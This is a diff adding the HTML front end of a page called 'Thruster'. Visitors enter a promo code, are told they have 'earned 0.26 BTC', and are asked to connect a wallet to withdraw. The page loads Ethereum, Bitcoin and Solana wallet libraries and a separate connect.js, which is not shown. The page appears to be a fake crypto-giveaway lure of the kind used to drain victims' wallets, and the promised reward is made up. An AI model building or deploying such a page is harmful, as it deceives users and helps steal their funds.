@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thruster</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to Thruster!</h1>
+        <div id="code-section">
+            <input type="text" id="promo-code" placeholder="Enter code">
+            <button id="submit-code">Submit</button>
+        </div>
+        <div id="congrats-section" style="display: none;">
+            <h2>Congratulations!</h2>
+            <p>You have earned 0.26 BTC!</p>
+            <div id="crypto-animation"></div>
+            <button id="connectWallet">Connect Wallet to Withdraw</button>
+        </div>
+    </div>
+    <script src="/node_modules/canvas-confetti/dist/confetti.browser.js"></script>
+    <script src="scripts.js"></script>
+    <script src="connect.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.0.0/dist/bitcoinjs-lib.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+</body>
+</html>
